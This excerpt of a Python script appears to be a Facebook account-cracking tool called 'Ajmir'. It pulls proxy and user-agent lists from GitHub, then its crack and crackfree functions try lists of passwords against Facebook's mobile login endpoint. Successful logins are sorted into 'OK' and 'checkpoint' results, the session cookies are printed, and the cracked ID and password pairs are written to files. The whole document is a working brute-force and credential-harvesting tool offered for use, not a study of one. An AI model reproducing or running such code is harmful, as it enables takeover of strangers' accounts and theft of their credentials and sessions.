...
princp=[]
try:
    prox= requests.get('https://github.com/DX-142/Api/blob/main/prox.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/DX-142/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
...
║\033[0;91m      db      db                     db           
║\033[0;91m     ;MM:                                         
║\033[0;91m    ,V^MM.  `7MM `7MMpMMMb.pMMMb.  `7MM  `7Mb,od8 
║\033[0;91m   ,M  `MM    MM   MM    MM    MM    MM    MM' "' 
║\033[0;91m   AbmmmqMA   MM   MM    MM    MM    MM    MM     
║\033[0;91m  A'     VML  MM   MM    MM    MM    MM    MM     
║\033[0;91m.AMA.   .AMMA.MM .JMML  JMML  JMML..JMML..JMML.   
║\033[0;91m           QO MP                                  
║\033[0;91m            `bmP                                   
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Ajmir•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Ajmir-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Ajmir-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Ajmir-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Ajmir-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Ajmir-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Ajmir,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
